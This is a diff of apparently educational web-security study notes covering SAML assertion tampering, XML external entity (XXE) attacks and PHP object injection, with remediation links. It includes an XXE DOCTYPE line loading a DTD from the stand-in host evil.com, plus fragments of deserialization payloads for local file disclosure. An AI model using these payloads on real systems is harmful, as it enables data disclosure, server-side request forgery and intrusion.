@@ -24,7 +24,10 @@ _Published 16th April 2018_
 ### Authentication - SAML
 ---
 
-**Reference Text**  
+**Summary**  
+
+XML input containing a reference to an external entity which is processed by a weakly configured XML parser, enabling disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. (OWASP)
+
 <a href="https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/">Common SAML Implementation Mistakes</a>  
 <a href="http://research.aurainfosec.io/bypassing-saml20-SSO/">SAML Raider guide</a>
 
@@ -32,10 +35,8 @@ _Published 16th April 2018_
 _Relay State_: a token to reference state information maintained by the Service Provider (SP).  
 _SAMLResponse_: the response from the Identity Provider (IDP) containing the base64 encoded Assertion to the SP.
 
-**Generic PoC (COMP6843)**  
-1.	Intercept requests between the Service Provider (SP) and Identity Provider (IDP) and grab SAML Assertion.
-2.	View SAML Assertion and change the values accordingly.
-3.	Forward the payload and profit.
+**Attack Vectors**  
+
 
 **Remediation**  
 <a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet">OWASP Auth Cheatsheet</a><br>  
@@ -43,6 +44,21 @@ _SAMLResponse_: the response from the Identity Provider (IDP) containing the bas
 
 ### XML – XML External Entities
 ---
+
+**Summary*
+
+Entity Types:
+* General entities - can be used in XML content like &name;
+  `<!ENTITY name "Hello World">`
+* Parameter entities - can be used inside doctype definition like %name; (parameter entities can insert new entities) and inside entities values like %name;.
+  `<!ENTITY % name "Hello World">`
+  `<!ENTITY % name "Hello %myEntity;">`
+* External entities - entities with query to external (not declared in current XML document) resource (can be used both: general entities and parameter entities)
+  `<!ENTITY name SYSTEM "URI/URL">`
+  `<!ENTITY name PUBLIC "any_text" "URI/URL">`
+* External entities can be used for doctypes too:
+  `<!DOCTYPE name SYSTEM "address.dtd" [...]>`
+  `<!DOCTYPE name PUBLIC "any text" "http://evil.com/evil.dtd">`
 
 **Basic XXE Test**
 ```xml
@@ -71,7 +87,7 @@ XXE Out of Bounds attack (XXE OOB)
 
 **PHP Object Injection Summary**  
 
-Allows an attacker to perform _code / sql injection_, _path traversal_ and _denial of service_ attacks due to user-input not being properly sanitised before being passed to the `unseralize()` PHP function.  
+Allows an attacker to perform _code / sql injection_, _path traversal_ and _denial of service_ attacks due to user-input not being properly sanitised before being passed to the `unseralize()` PHP function. (OWASP)
 
 Since PHP allows object serialisation, attackers can pass in a malicious string to a vulnerable `unserialize()` call, resulting in arbitrary PHP object injection.  
 
@@ -114,7 +130,7 @@ echo urlencode(serialize(new PHPObjectInjection));
 ```
 
 Example: Local File Disclosure
-```
+```PHP
 class PHPObjectInjection
 {
    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
@@ -129,8 +145,6 @@ echo urlencode(serialize(new PHPObjectInjection));
 **Remediation**
 
 Do not use unserialize() function with user-supplied input, use JSON functions instead i.e. `json_encode()` / `json_decode()`.
- 
-
 
 ### Advanced XSS - Same Origin Policy
 ---
